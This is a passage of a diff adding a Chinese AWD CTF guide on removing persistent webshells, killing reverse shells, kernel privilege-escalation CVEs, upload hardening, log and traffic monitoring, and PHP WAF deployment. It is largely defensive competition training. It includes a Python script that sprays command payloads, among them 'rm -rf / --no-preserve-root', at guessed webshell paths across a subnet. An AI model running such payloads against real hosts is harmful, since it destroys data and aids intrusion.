+</code></pre><p>(3)&#x7528;&#x4E00;&#x4E2A;ignore_user_abort(true)&#x811A;&#x672C;&#xFF0C;&#x4E00;&#x76F4;&#x7ADE;&#x4E89;&#x5199;&#x5165;&#xFF08;&#x65AD;&#x65AD;&#x7EED;&#x7EED;&#xFF09;&#x3002;usleep&#x8981;&#x4F4E;&#x4E8E;&#x5BF9;&#x65B9;&#x4E0D;&#x6B7B;&#x9A6C;&#x8BBE;&#x7F6E;&#x7684;&#x503C;&#x3002;</p>
+<pre class="language-"><code><span class="token prolog">&lt;?php
+while (1) {
+    $pid=1234;  #&#x4E0D;&#x6B7B;&#x9A6C;&#x8FDB;&#x7A0B;
+    @unlink(&apos;demo.php&apos;);
+    exec(&apos;kill -9 $pid&apos;);
+}
+?&gt;</span>
+
+<span class="token prolog">&lt;?php
+    ignore_user_abort(true);
+    set_time_limit(0);
+    unlink(__FILE__);
+    $file = &apos;.3.php&apos;;
+    $code = &apos;hi springbird !&apos;;
+    //pass=pass
+    while (1){
+        file_put_contents($file,$code);
+        system(&apos;touch -m -d &quot;2018-12-01 09:10:12&quot; .3.php&apos;);
+    //    usleep(5000);
+          usleep(1000);
+    }
+?&gt;</span>
+</code></pre><p>(4)&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x548C;&#x4E0D;&#x6B7B;&#x9A6C;&#x751F;&#x6210;&#x7684;&#x9A6C;&#x4E00;&#x6837;&#x540D;&#x5B57;&#x7684;&#x6587;&#x4EF6;&#x5939; mkdir 1.php
+&#x5FAA;&#x73AF;&#x521B;&#x5EFA;</p>
+<pre class="language-"><code>#!/bin/bash
+dire=&quot;/var/www/html/.base.php/&quot;
+file=&quot;/var/www/html/.base.php&quot;
+rm -rf $file
+mkdir $dire
+./xx.sh
+</code></pre><h2 id="&#x6E05;&#x9664;&#x53CD;&#x5F39;shell">&#x6E05;&#x9664;&#x53CD;&#x5F39;shell</h2>
+<p>&#x67E5;&#x770B;&#x8FDB;&#x7A0B;</p>
+<pre class="language-"><code>ps -ef / px -aux
+</code></pre><p>&#x51FA;&#x73B0;www-data&#x6743;&#x9650;&#x7684;/bin/sh&#x4E00;&#x822C;&#x4E3A;nc</p>
+<p>&#x7136;&#x540E;&#x6740;&#x8FDB;&#x7A0B;</p>
+<pre class="language-"><code>kill `ps -aux | grep www-data | grep apache2 | awk &apos;{print $2}&apos;`
+</code></pre><h2 id="&#x63D0;&#x6743;">&#x63D0;&#x6743;</h2>
+<p>&#x5728;AWD&#x4E2D;&#xFF0C;&#x4E00;&#x822C;&#x90FD;&#x9700;&#x8981;&#x4E13;&#x95E8;&#x9632;&#x5FA1;&#x52A0;&#x56FA;&#x81EA;&#x5DF1;&#x670D;&#x52A1;&#x5668;&#x7684;&#x73AF;&#x8282;&#xFF0C;&#x4F46;&#x52A0;&#x56FA;&#x7684;&#x5F88;&#x591A;&#x64CD;&#x4F5C;&#x90FD;&#x4F1A;&#x6D89;&#x53CA;&#x5230;root&#x6743;&#x9650;&#xFF0C;&#x5982;&#x679C;&#x76F4;&#x63A5;&#x7ED9;root&#x6743;&#x9650;&#x6700;&#x597D;&#xFF0C;&#x4F46;&#x4E00;&#x822C;&#x53EA;&#x4F1A;&#x7ED9;&#x4E00;&#x4E2A;&#x666E;&#x901A;&#x6743;&#x9650;&#x8D26;&#x53F7;&#xFF0C;&#x8FD9;&#x65F6;&#x5019;&#x5F80;&#x5F80;&#x5C31;&#x9700;&#x8981;&#x7ED9;&#x670D;&#x52A1;&#x5668;&#x63D0;&#x6743;&#x4E86;&#x3002;</p>
+<p>&#x5173;&#x4E8E;&#x63D0;&#x6743;&#xFF0C;&#x901A;&#x5E38;&#x6211;&#x4EEC;&#x8981;&#x6839;&#x636E;kernel&#x7248;&#x672C;&#x53F7;&#x627E;&#x5230;&#x5BF9;&#x5E94;&#x7684;poc&#xFF0C;&#x5E73;&#x65F6;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6536;&#x96C6;&#x6D4B;&#x8BD5;&#x4E00;&#x4E9B;&#x6BD4;&#x8F83;&#x65B0;&#x7684;&#x63D0;&#x6743;poc&#xFF0C;&#x4EE5;&#x5907;&#x4E0D;&#x65F6;&#x4E4B;&#x9700;&#x3002;</p>
+<p>&#x5F71;&#x54CD;&#x8303;&#x56F4;&#x6BD4;&#x8F83;&#x5927;&#x7684;&#x6F0F;&#x6D1E;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x63D0;&#x6743;&#xFF1A;</p>
+<pre class="language-"><code>CVE-2017-6074 (DCCP&#x53CC;&#x91CD;&#x91CA;&#x653E;&#x6F0F;&#x6D1E; &gt; 2.6.18 ) &#xFF1A;
+DCCP&#x53CC;&#x91CD;&#x91CA;&#x653E;&#x6F0F;&#x6D1E;&#x53EF;&#x5141;&#x8BB8;&#x672C;&#x5730;&#x4F4E;&#x6743;&#x9650;&#x7528;&#x6237;&#x4FEE;&#x6539;Linux&#x5185;&#x6838;&#x5185;&#x5B58;&#xFF0C;&#x5BFC;&#x81F4;&#x62D2;&#x7EDD;&#x670D;&#x52A1;(&#x7CFB;&#x7EDF;&#x5D29;&#x6E83;)&#x6216;&#x8005;&#x63D0;&#x5347;&#x6743;&#x9650;&#xFF0C;&#x83B7;&#x5F97;&#x7CFB;&#x7EDF;&#x7684;&#x7BA1;&#x7406;&#x8BBF;&#x95EE;&#x6743;&#x9650;
+
+CVE-2016-5195(&#x810F;&#x725B;&#xFF0C;kernel 2.6.22 &lt; 3.9 (x86/x64)) &#xFF1A;
+&#x4F4E;&#x6743;&#x9650;&#x7528;&#x6237;&#x53EF;&#x4FEE;&#x6539;root&#x7528;&#x6237;&#x521B;&#x5EFA;&#x7684;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#xFF0C;&#x5982;&#x4FEE;&#x6539; /etc/passwd&#xFF0C;&#x628A;&#x5F53;&#x524D;&#x7528;&#x6237;&#x7684; uid &#x6539;&#x6210; 0 &#x5373;&#x53EF;&#x63D0;&#x5347;&#x4E3A;root&#x6743;&#x9650;
+
+CVE-2016-8655(Ubuntu 12.04&#x3001;14.04&#xFF0C;Debian 7&#x3001;8) &#xFF1A;
+&#x6761;&#x4EF6;&#x7ADE;&#x4E89;&#x6F0F;&#x6D1E;&#xFF0C;&#x53EF;&#x4EE5;&#x8BA9;&#x4F4E;&#x6743;&#x9650;&#x7684;&#x8FDB;&#x7A0B;&#x83B7;&#x5F97;&#x5185;&#x6838;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x6743;&#x9650;
+POC&#xFF1A;https://www.seebug.org/vuldb/ssvid-92567
+
+CVE-2017-1000367(sudo&#x672C;&#x5730;&#x63D0;&#x6743;&#x6F0F;&#x6D1E; ) &#xFF1A;L
+inux Kernel Stack Clash&#x5B89;&#x5168;&#x6F0F;&#x6D1E;&#x3002;&#x8BE5;&#x6F0F;&#x6D1E;&#x662F;&#x7531;&#x4E8E;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x5806;&#x6808;&#x51B2;&#x7A81;&#x6F0F;&#x6D1E;&#xFF0C;&#x5B83;&#x5F71;&#x54CD;Linux&#xFF0C;FreeBSD&#x548C;OpenBSD&#xFF0C;NetBSD&#xFF0C;Solaris&#xFF0C;i386&#x548C;AMD64&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x5B83;&#x7834;&#x574F;&#x5185;&#x5B58;&#x5E76;&#x6267;&#x884C;&#x4EFB;&#x610F;&#x4EE3;&#x7801; &#x3002;
+
+CVE-2016-1247(Nginx&#x6743;&#x9650;&#x63D0;&#x5347;&#x6F0F;&#x6D1E;) &#xFF1A;
+Nginx&#x670D;&#x52A1;&#x5728;&#x521B;&#x5EFA;log&#x76EE;&#x5F55;&#x65F6;&#x4F7F;&#x7528;&#x4E86;&#x4E0D;&#x5B89;&#x5168;&#x7684;&#x6743;&#x9650;&#x8BBE;&#x7F6E;&#xFF0C;&#x53EF;&#x9020;&#x6210;&#x672C;&#x5730;&#x6743;&#x9650;&#x63D0;&#x5347;&#xFF0C;&#x6076;&#x610F;&#x653B;&#x51FB;&#x8005;&#x80FD;&#x591F;&#x501F;&#x6B64;&#x5B9E;&#x73B0;&#x4ECE; nginx/web &#x7684;&#x7528;&#x6237;&#x6743;&#x9650; www-data &#x5230; root &#x7528;&#x6237;&#x6743;&#x9650;&#x7684;&#x63D0;&#x5347;&#x3002;
+POC&#xFF1A;https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
+</code></pre><h2 id="&#x6F0F;&#x6D1E;&#x4FEE;&#x590D;">&#x6F0F;&#x6D1E;&#x4FEE;&#x590D;</h2>
+<p>&#x57FA;&#x672C;&#x539F;&#x5219;</p>
+<ul>
+<li>&#x80FD;&#x4FEE;&#x590D;&#x7684;&#x5C3D;&#x91CF;&#x4FEE;&#x590D;&#xFF1B;</li>
+<li>&#x4E0D;&#x80FD;&#x4FEE;&#x590D;&#x7684;&#x5148;&#x6CE8;&#x91CA;&#x6E90;&#x7801;&#xFF0C;&#x4E0D;&#x5F71;&#x54CD;&#x9875;&#x9762;&#x663E;&#x793A;&#x518D;&#x5220;&#x9664;&#xFF1B;</li>
+<li>&#x7AD9;&#x70B9;&#x548C;&#x5BF9;&#x5E94;&#x7684;&#x529F;&#x80FD;&#x5C3D;&#x53EF;&#x80FD;&#x4E0D;&#x5B95;&#x673A;&#xFF1B;</li>
+</ul>
+<p>&#x6280;&#x5DE7;</p>
+<ul>
+<li>&#x8BBE;&#x7F6E; waf&#xFF0C;&#x5982; load_file&#xFF1B;</li>
+<li>&#x5BF9;&#x4E8E;&#x4E00;&#x4E9B;&#x6210;&#x578B;&#x7684; CMS&#xFF0C;&#x627E;&#x5230;&#x76F8;&#x5E94;&#x7248;&#x672C;&#x53F7;&#x540E;&#xFF0C;&#x5BF9;&#x5176; diff&#xFF1B;</li>
+<li>&#x4FEE;&#x6539;&#x5F31;&#x53E3;&#x4EE4;&#x7528;&#x6237;&#xFF1B;</li>
+<li>&#x5BF9;&#x4E8E;&#x89C9;&#x5F97;&#x5371;&#x9669;&#x51FD;&#x6570;&#x7684;&#x5730;&#x65B9;&#x76F4;&#x63A5;&#x4F7F;&#x7528;die()&#xFF1B;</li>
+</ul>
+<p>&#x6BD4;&#x5982;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x6F0F;&#x6D1E;&#x4FEE;&#x590D;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;upload&#x76EE;&#x5F55;&#x4E0B;&#x5199;.htaccess&#x7981;&#x6B62;php&#x6587;&#x4EF6;&#x6267;&#x884C;</p>
+<pre class="language-"><code>&lt;Directory &quot;/var/www/html/upload&quot;&gt;
+Options -ExecCGI -Indexes
+AllowOverride None
+RemoveHandler .php .phtml .php3 .pht .php4 .php5 .php7 .shtml
+RemoveType .php .phtml .php3 .pht .php4 .php5 .php7 .shtml
+php_flag engine off
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FilesMatch</span> <span class="token attr-name">&quot;.+\.ph(p[3457]?|t|tml)$&quot;</span><span class="token punctuation">&gt;</span></span>
+deny from all
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FilesMatch</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Directory</span><span class="token punctuation">&gt;</span></span>
+</code></pre><p>&#x4E00;&#x4E9B;&#x4FEE;&#x590D;&#x6280;&#x5DE7;&#x53C2;&#x8003;&#xFF1A;<a href="https://qftm.github.io/2019/08/03/AWD-Bugs-Fix/" target="_blank">https://qftm.github.io/2019/08/03/AWD-Bugs-Fix/</a></p>
+<h2 id="&#x65E5;&#x5FD7;&#x5206;&#x6790;">&#x65E5;&#x5FD7;&#x5206;&#x6790;</h2>
+<p>&#x547D;&#x4EE4;&#x884C;&#x52A8;&#x6001;&#x67E5;&#x770B;&#x65E5;&#x5FD7;</p>
+<pre class="language-"><code>tailf /var/log/apache2/access.log
+</code></pre><p>&#x8FD8;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5DE5;&#x5177;&#x8FDB;&#x884C;&#x65E5;&#x5FD7;&#x5206;&#x6790;&#xFF1A;<a href="https://security.tencent.com/index.php/opensource/detail/15" target="_blank">LogForensics &#x817E;&#x8BAF;&#x5B9E;&#x9A8C;&#x5BA4; /web&#x65E5;&#x5FD7;&#x53D6;&#x8BC1;&#x5206;&#x6790;&#x5DE5;&#x5177;</a></p>
+<p>&#x65E5;&#x5FD7;&#x7684;&#x5B58;&#x653E;&#x5730;&#x5740;</p>
+<pre class="language-"><code>/var/log/apache2/
+/usr/local/apache2/logs
+/usr/nginx/logs/
+</code></pre><p>&#x4E3A;&#x4E86;&#x5BF9;&#x5176;&#x4ED6;&#x9632;&#x5B88;&#x65B9;&#x8FDB;&#x884C;&#x5E72;&#x6270;&#xFF0C;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x811A;&#x672C;&#x53D1;&#x751F;&#x5927;&#x91CF;&#x5783;&#x573E;&#x6570;&#x636E;&#x5305;&#xFF0C;&#x6DF7;&#x6DC6;&#x89C6;&#x89C9;&#xFF0C;&#x7ED9;&#x5BF9;&#x65B9;&#x4EBA;&#x5458;&#x589E;&#x52A0;&#x68C0;&#x6D4B;&#x7684;&#x96BE;&#x5EA6;&#xFF0C;&#x6D6A;&#x8D39;&#x5BF9;&#x65B9;&#x7684;&#x65F6;&#x95F4;&#x3002;</p>
+<pre class="language-"><code>import requests
+import time
+
+def scan_attack():
+    file={&apos;shell.php&apos;,&apos;admin.php&apos;,&apos;web.php&apos;,&apos;login.php&apos;,&apos;1.php&apos;,&apos;index.php&apos;}
+    payload={&apos;cat /flag&apos;,&apos;ls -al&apos;,&apos;rm -f&apos;,&apos;echo 1&apos;,&apos;echo 1 /proc/sys/net/ipv4/ip_forward&apos;,&apos;rm -rf / --no-preserve-root&apos;}
+    while(1):
+        for i in range(1, 50):
+            for ii in file:
+                url=&apos;http://192.168.182.&apos;+ str(i)+&apos;/&apos;+ii
+                print(url)
+                for iii in payload:
+                    data={
+                        &apos;payload&apos;:iii
+                    }
+                    try:
+                        requests.post(url,data=data)
+                        print(&quot;&#x6B63;&#x5728;&#x6405;&#x5C4E;:&quot;+str(i)+&apos;|&apos;+ii+&apos;|&apos;+iii)
+                        time.sleep(0.1)
+                    except Exception as e:
+                        time.sleep(0.1)
+                        pass
+
+
+if __name__ == &apos;__main__&apos;:
+    scan_attack()
+</code></pre><h2 id="&#x6D41;&#x91CF;&#x5206;&#x6790;">&#x6D41;&#x91CF;&#x5206;&#x6790;</h2>
+<p>&#x5728;&#x6BD4;&#x8D5B;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x6293;&#x53D6;&#x6D41;&#x91CF;&#x5305;&#xFF0C;&#x9700;&#x8981;&#x7684;&#x6743;&#x9650;&#x6BD4;&#x8F83;&#x9AD8;&#xFF0C;&#x4E00;&#x822C;&#x6BD4;&#x8D5B;&#x7528;&#x4E0D;&#x5230;</p>
+<pre class="language-"><code>sudo tcpdump -s 0 -w flow.pcap port 80
+# &#x7136;&#x540E;&#x4F7F;&#x7528; scp &#x5199;&#x4E2A;&#x811A;&#x672C;&#x5B9E;&#x65F6;&#x5C06;&#x6D41;&#x91CF;&#x5305;&#x62F7;&#x8D1D;&#x5230;&#x672C;&#x5730;
+
+
+tcpdump tcp -i eth1 -t -s 0 -c 100 and dst port ! 22 and src net 192.168.1.0/24 -w ./target.cap
+&#x547D;&#x4EE4;&#x62C6;&#x89E3;&#x5206;&#x6790;&#xFF1A;
+1&#x3001;tcp: ip icmp arp rarp &#x548C; tcp&#x3001;udp&#x3001;icmp&#x8FD9;&#x4E9B;&#x9009;&#x9879;&#x7B49;&#x90FD;&#x8981;&#x653E;&#x5230;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x7528;&#x6765;&#x8FC7;&#x6EE4;&#x6570;&#x636E;&#x62A5;&#x7684;&#x7C7B;&#x578B;
+2&#x3001;-i eth1 : &#x53EA;&#x6293;&#x7ECF;&#x8FC7;&#x63A5;&#x53E3;eth1&#x7684;&#x5305;
+3&#x3001;-t : &#x4E0D;&#x663E;&#x793A;&#x65F6;&#x95F4;&#x6233;
+4&#x3001;-s 0 : &#x6293;&#x53D6;&#x6570;&#x636E;&#x5305;&#x65F6;&#x9ED8;&#x8BA4;&#x6293;&#x53D6;&#x957F;&#x5EA6;&#x4E3A;68&#x5B57;&#x8282;&#x3002;&#x52A0;&#x4E0A;-S 0 &#x540E;&#x53EF;&#x4EE5;&#x6293;&#x5230;&#x5B8C;&#x6574;&#x7684;&#x6570;&#x636E;&#x5305;
+5&#x3001;-c 100 : &#x53EA;&#x6293;&#x53D6;100&#x4E2A;&#x6570;&#x636E;&#x5305;
+6&#x3001;dst port ! 22 : &#x4E0D;&#x6293;&#x53D6;&#x76EE;&#x6807;&#x7AEF;&#x53E3;&#x662F;22&#x7684;&#x6570;&#x636E;&#x5305;
+7&#x3001;src net 192.168.1.0/24 : &#x6570;&#x636E;&#x5305;&#x7684;&#x6E90;&#x7F51;&#x7EDC;&#x5730;&#x5740;&#x4E3A;192.168.1.0/24
+8&#x3001;-w ./target.cap : &#x4FDD;&#x5B58;&#x6210;cap&#x6587;&#x4EF6;&#xFF0C;&#x65B9;&#x4FBF;&#x7528;wireshark&#x5206;&#x6790;
+</code></pre><p>PHP&#x7248;&#x6D41;&#x91CF;&#x76D1;&#x63A7;</p>
+<pre class="language-"><code><span class="token prolog">&lt;?php
+
+  date_default_timezone_set(&apos;Asia/Shanghai&apos;);
+
+$ip = $_SERVER[&quot;REMOTE_ADDR&quot;]; //&#x8BB0;&#x5F55;&#x8BBF;&#x95EE;&#x8005;&#x7684;ip
+
+$filename = $_SERVER[&apos;PHP_SELF&apos;]; //&#x8BBF;&#x95EE;&#x8005;&#x8981;&#x8BBF;&#x95EE;&#x7684;&#x6587;&#x4EF6;&#x540D;
+
+$parameter = $_SERVER[&quot;QUERY_STRING&quot;]; //&#x8BBF;&#x95EE;&#x8005;&#x8981;&#x8BF7;&#x6C42;&#x7684;&#x53C2;&#x6570;
+
+$time = date(&apos;Y-m-d H:i:s&apos;,time()); //&#x8BBF;&#x95EE;&#x65F6;&#x95F4;
+
+$logadd = &apos;&#x6765;&#x8BBF;&#x65F6;&#x95F4;&#xFF1A;&apos;.$time.&apos;--&gt;&apos;.&apos;&#x8BBF;&#x95EE;&#x94FE;&#x63A5;&#xFF1A;&apos;.&apos;http://&apos;.$ip.$filename.&apos;?&apos;.$parameter.&quot;\r\n&quot;;
+
+// log&#x8BB0;&#x5F55;
+
+$fh = fopen(&quot;log.txt&quot;, &quot;a&quot;);
+
+fwrite($fh, $logadd);
+
+fclose($fh);
+
+?&gt;</span>
+</code></pre><p>&#x4E00;&#x4E2A;&#x9488;&#x5BF9;php&#x7684;web&#x6D41;&#x91CF;&#x6293;&#x53D6;&#x3001;&#x5206;&#x6790;&#x7684;&#x5E94;&#x7528;&#xFF1A;<a href="https://github.com/wupco" target="_blank">wupco</a>/<a href="https://github.com/wupco/weblogger" target="_blank">weblogger</a>
+&#x4F7F;&#x7528;&#x65B9;&#x6CD5;</p>
+<pre class="language-"><code>cd /var/www/html/ (or other web dir)
+
+   git clone https://github.com/wupco/weblogger.git
+
+   chmod -R 777 weblogger/
+
+   open http://xxxxx/weblogger/install.php in Web browser
+
+   install it
+</code></pre><h2 id=""> </h2>
+<h2 id="waf">WAF</h2>
+<p>waf&#x7684;&#x4F5C;&#x7528;&#xFF1A;
+1.&#x6700;&#x91CD;&#x8981;&#x662F;&#x5206;&#x6790;&#x6D41;&#x91CF;&#xFF0C;&#x522B;&#x4EBA;&#x653B;&#x51FB;&#x6211;&#x4EEC;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x522B;&#x4EBA;&#x7684;&#x653B;&#x51FB;&#x65B9;&#x5F0F;&#x3002;&#x8FD9;&#x6837;&#x7684;&#x8BDD;&#x5373;&#x4F7F;&#x6211;&#x4EEC;&#x627E; &#x4E0D;&#x5230;&#x653B;&#x51FB;&#x70B9;&#xFF0C;&#x975E;&#x5E38;&#x82E6;&#x607C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x5206;&#x6790;&#x6D41;&#x91CF;&#xFF0C;&#x4F7F;&#x7528;&#x522B;&#x4EBA;&#x7684;&#x653B;&#x51FB;&#x65B9;&#x5F0F;&#x3002;
+2.&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8FDB;&#x884C;&#x9632;&#x5FA1;&#xFF0C;&#x7C7B;&#x4F3C;&#x4E8E;&#x4E00;&#x53F0;&#x9632;&#x706B;&#x5899;&#xFF08;&#x4E00;&#x822C;&#x7684;&#x6BD4;&#x8D5B;&#x662F;&#x4E0D;&#x5141;&#x8BB8;&#x4F7F;&#x7528;&#x7684;&#xFF0C;&#x6BD5;&#x7ADF;&#x6BD4;&#x8D5B;&#x65F6;&#x95F4;&#x77ED;&#xFF0C;&#x5C31;&#x6839;&#x672C;&#x7ED5;&#x4E0D;&#x8FC7;&#x53BB;waf&#xFF0C;&#x90A3;&#x6BD4;&#x8D5B;&#x5C31;&#x6CA1;&#x610F;&#x601D;&#x4E86;&#xFF09;</p>
+<p>&#x6709;&#x4E9B;&#x6BD4;&#x8D5B;&#x662F;&#x4E0D;&#x5141;&#x8BB8;&#x4E0A;&#x901A;&#x7528;waf&#x7684;&#xFF0C;check&#x673A;&#x5236;&#x53EF;&#x80FD;&#x4F1A;check&#x5230;waf&#x8FC7;&#x6EE4;&#x7684;&#x53C2;&#x6570;&#xFF0C;&#x5BFC;&#x81F4;&#x5B95;&#x673A;&#xFF0C;waf&#x90E8;&#x7F72;&#x9700;&#x8981;&#x8C28;&#x614E;&#xFF0C;&#x8FD8;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF1A;&#x4E0A;&#x5B8C;waf&#x68C0;&#x67E5;&#x670D;&#x52A1;&#x662F;&#x5426;&#x53EF;&#x7528;&#xFF0C;&#x90E8;&#x5206;&#x68C0;&#x67E5;&#x5141;&#x8BB8;&#x4F7F;&#x7528;&#x90E8;&#x5206;&#x5C0F;&#x7684;waf&#xFF0C;&#x4F1A;&#x68C0;&#x67E5;&#x9875;&#x9762;&#x5B8C;&#x6574;&#x6027;&#x3001;&#x670D;&#x52A1;&#x5B8C;&#x6574;&#x6027;&#x3002;</p>
+<p>&#x5E38;&#x7528;&#x7684;waf&#x4F7F;&#x7528;&#x65B9;&#x6CD5;&#xFF0C;&#x662F;&#x7528;&#x4F60;&#x8981;&#x4FDD;&#x62A4;&#x7684;&#x6587;&#x4EF6;&#x53BB;&#x5305;&#x542B;&#x8FD9;&#x4E2A;waf.php&#x3002;&#x6BD4;&#x5982;&#x8BF4;&#xFF0C;&#x4F60;&#x8981;&#x4FDD;&#x62A4;select.php&#xFF0C;&#x90A3;&#x4E48;&#x4F60;&#x5C31;&#x5728;select.php&#x91CC;&#x9762;&#x5199;&#x4E0A;&#x4E00;&#x884C;include &apos;./waf.php&apos;&#x6216;&#x8005; require_once(&apos;waf.php&apos;);
+&#x5982;&#x679C;&#x4F60;&#x8981;&#x4FDD;&#x62A4;&#x6240;&#x6709;&#x6587;&#x4EF6;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x5728;config&#x8FD9;&#x79CD;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x91CC;&#x5305;&#x542B;waf&#xFF0C;&#x56E0;&#x4E3A;&#x8FD9;&#x79CD;config&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x4E00;&#x822C;&#x4F1A;&#x88AB;&#x5927;&#x90E8;&#x5206;&#x529F;&#x80FD;&#x9875;&#x9762;&#x8C03;&#x7528;</p>
+<p>&#x7F51;&#x4E0A;&#x5F88;&#x591A;waf&#x811A;&#x672C;&#xFF0C;&#x8FD9;&#x91CC;&#x4ECB;&#x7ECD;&#x51E0;&#x4E2A;waf&#x9879;&#x76EE;</p>
+<p><strong>1.AWD_PHP_WAF</strong>
+&#x9879;&#x76EE;&#x5730;&#x5740;&#xFF1A;<a href="https://github.com/NonupleBroken/AWD_PHP_WAF" target="_blank">https://github.com/NonupleBroken/AWD_PHP_WAF</a></p>
+<p>&#x4F7F;&#x7528;&#x65B9;&#x6CD5;&#xFF1A;
+&#x4F7F;&#x7528;&#x524D;&#x5148;&#x4FEE;&#x6539;config.php&#x5185;&#x7684;&#x5BC6;&#x7801;&#xFF0C;&#x5BC6;&#x7801;&#x4F7F;&#x7528;sha256&#x52A0;&#x5BC6;</p>
+<pre class="language-"><code>&#x4E0A;waf&#xFF1A;
+$ find . -path ./waffffff -prune -o -type f -name &quot;*.php&quot; -print | xargs sed -i &quot;s/&lt;?php/&lt;?php include_once(\&quot;\/var\/www\/html\/waffffff\/waf.php\&quot;);/g&quot;
+
+&#x4E0B;waf&#xFF1A;
+$ find . -path ./waffffff -prune -o -type f -name &quot;*.php&quot; -print | xargs sed -i &quot;s/&lt;?php include_once(\&quot;\/var\/www\/html\/waffffff\/waf.php\&quot;);/&lt;?php/g&quot;
+</code></pre><p>&#x6BD4;&#x5982;&#x8BBF;&#x95EE; web &#x76EE;&#x5F55;&#x4E0B;&#x7684;/waffffff/admin.php?password=123456</p>
+<p><strong>2.CTF-WAF</strong>
+&#x9879;&#x76EE;&#x5730;&#x5740;&#xFF1A;<a href="https://github.com/sharpleung/CTF-WAF" target="_blank">https://github.com/sharpleung/CTF-WAF</a></p>
+<p><strong>3.awd-watchbird</strong>
+&#x8FD9;&#x662F;&#x4E2A;&#x901A;&#x9632;waf&#xFF0C;&#x652F;&#x6301;&#x6D41;&#x91CF;&#x8F6C;&#x53D1;&#x548C;&#x66FF;&#x6362;flag
+&#x9879;&#x76EE;&#x5730;&#x5740;&#xFF1A;<a href="https://github.com/leohearts/awd-watchbird" target="_blank">https://github.com/leohearts/awd-watchbird</a></p>
+<p>1.&#x6253;&#x5305;&#x597D;&#x597D;&#x4E4B;&#x540E;&#x76F4;&#x63A5;&#x4E0A;&#x4F20;&#x5230;html&#x76EE;&#x5F55;&#x4E0B;&#xFF0C;&#x56DE;&#x5230;&#x7EC8;&#x7AEF;&#xFF0C;&#x5728;&#x4E0A;&#x4F20;&#x7684;waf&#x76EE;&#x5F55;&#x4E0B;&#xFF0C;&#x4F7F;&#x7528;&#x547D;&#x4EE4;</p>
+<pre class="language-"><code>php watchbird.php --install /var/www/html
+</code></pre><p>&#x8FD9;&#x6837;&#x5C31;&#x80FD;&#x4F7F;&#x6BCF;&#x4E2A;&#x9875;&#x9762;&#x7684;php&#x4EE3;&#x7801;&#x5305;&#x542B;&#x5230;waf&#x4E0B;</p>
+<p>2.&#x8FD0;&#x884C;waf &#x4E4B;&#x540E;&#xFF0C;&#x6253;&#x5F00;&#x6211;&#x4EEC;&#x7684;web &#x9875;&#x9762;&#xFF0C;&#x5728;&#x4EFB;&#x610F;&#x4E00;&#x4E2A;php &#x9875;&#x9762;&#x540E;&#x9762;&#x8F93;&#x5165;?watchbird=ui&#xFF0C;&#x5C31;&#x4F1A;&#x8FDB;&#x5165;&#x5230;waf &#x914D;&#x7F6E;&#x9875;&#x9762;&#x7136;&#x540E;&#x8BBE;&#x7F6E;&#x5BC6;&#x7801;(&#x6CE8;&#x610F;&#xFF1A;&#x7B2C;&#x4E00;&#x6B21;&#x6253;&#x5F00;&#x9700;&#x8981;&#x8BBE;&#x7F6E;&#x5BC6;&#x7801;)</p>
+<p>3.&#x914D;&#x7F6E;&#x597D;&#x4E4B;&#x540E;&#x5C31;&#x80FD;&#x8FDB;&#x5165;&#x5185;&#x90E8;&#x7F51;&#x9875;</p>
+<p><strong>4.AoiAWD</strong>
+&#x9879;&#x76EE;&#x5730;&#x5740;&#xFF1A;<a href="https://github.com/DasSecurity-HatLab/AoiAWD" target="_blank">https://github.com/DasSecurity-HatLab/AoiAWD</a></p>
+<p>&#x4F7F;&#x7528;&#x65B9;&#x6CD5;&#xFF1A;<a href="https://www.wlhhlc.top/posts/16692/" target="_blank">AoiAWD-&#x840C;&#x65B0;&#x7684;&#x5F97;&#x5206;&#x5229;&#x5668;</a>
+&#x4E0B;&#x8F7D;&#x597D;&#xFF0C;&#x81EA;&#x5DF1;&#x53BB;&#x7F16;&#x8BD1;&#x6216;&#x8005;&#x627E;&#x7F16;&#x8BD1;&#x597D;&#x7684;&#x76F4;&#x63A5;&#x7528;</p>
+<h2 id="&#x9632;&#x5FA1;&#x6405;&#x5C4E;">&#x9632;&#x5FA1;&#x6405;&#x5C4E;</h2>
